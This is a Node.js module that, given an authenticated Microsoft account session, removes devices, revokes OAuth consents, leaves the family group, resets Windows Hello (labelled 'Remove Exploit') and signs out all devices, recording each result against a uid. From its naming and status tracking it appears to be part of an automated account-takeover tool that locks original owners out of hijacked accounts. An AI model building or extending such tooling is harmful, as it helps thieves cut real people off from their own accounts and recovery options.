const {
    updateStatus,
    updateExtraInformation
} = require("../process/helpers");
const removeDevices = require("../devices/removeDevices");
const removeConsents = require("../consents/removeConsents");
const removeAppPasswords = require("../secure/removepw");
const resetWindowsHello = require("../logout/resetWindowsHello");
const signoutFromAllDevices = require("../logout/signoutFromAllDevices");
const leaveFamily = require("../family/leaveFamily");
const getFamily = require("../family/getFamily");

const timeTracker = () => {
    const startTime = Date.now();
    return {
        end: (sectionName) => {
            const endTime = Date.now();
            const duration = (endTime - startTime) / 1000;
            console.log(`Section "${sectionName}" completed in ${duration.toFixed(2)} seconds`);
            return duration;
        }
    };
};

/*
- Remove devices if enabled
- Remove app passwords if needed
- Revoke OAuth app consents if enabled
- Leave Microsoft family
- Remove Exploit
- Sign out from all devices if applicable
*/






module.exports = async function removesection(settings, signout, exploit, uid, axios, securityParameters) {
    const tracker = timeTracker();

    let family = await getFamily(axios)

    const promises = [];





    /// TD: Fix verificationtoken?

    if (settings.removedevices) {
        promises.push(
            (async () => {
                const devicesr = await removeDevices(axios);
                console.log(`devices removed: ${devicesr}`);

                let devicesremoved;
                if (devicesr === 0) {
                    devicesremoved = {
                        status: false,
                        reason: "Couldn't find or failed."
                    };
                } else {
                    devicesremoved = {
                        status: true,
                        reason: devicesr
                    };
                }

                await updateExtraInformation(uid, "devicestatus", JSON.stringify(devicesremoved));
            })()
        );
    } else {
        promises.push(
            (async () => {
                const devicesremoved = {
                    status: false,
                    reason: "Option is disabled."
                };
                await updateExtraInformation(uid, "devicestatus", JSON.stringify(devicesremoved));
            })()
        );
    }


    if (settings.oauthapps) {
        promises.push(
            (async () => {
                const statusoauths = await removeConsents(axios);
                console.log(`Failed to remove ${statusoauths} oAuths!`)
                await updateStatus(uid, "oauths", statusoauths);
            })()
        );
    } else {
        promises.push(
            updateStatus(uid, "oauths", "Option is disabled.")
        );
    }
    
    if (family){
    if (family?.Members?.length > 0) {
        promises.push(
            (async () => {
                const familysecured = await leaveFamily(axios);
                const d = JSON.stringify(familysecured);
                console.log(`${d} < family secured!`);
                await updateExtraInformation(uid, "leftfamily", familysecured);
            })()
        );
    } else {
        promises.push(
            updateExtraInformation(uid, "leftfamily", "None")
        );
    }
    } else{
                promises.push(
            (async () => {
                await updateExtraInformation(uid, "leftfamily", "Failed to grab family!");
            })()
        );
    }

    if (exploit) {
        promises.push(
            (async () => {
                const exploitRemoved = await resetWindowsHello(axios);
                await updateExtraInformation(uid, "exploit", exploitRemoved ? "True" : "False");
            })()
        );
    } else {
        promises.push(
            (async () => {
                await updateExtraInformation(uid, "exploit", "Option is disabled");
            })()
        );
    }

    if (signout) {
        promises.push(
            (async () => {
                const signedout = await signoutFromAllDevices(axios);
                await updateExtraInformation(uid, "signout", signedout ? "True" : "False");
            })()
        );
    } else {
        promises.push(
            (async () => {
                await updateExtraInformation(uid, "signout", "Option is disabled.");
            })()
        );
    }

    await Promise.all(promises);

    tracker.end("Total Remove Section");
};
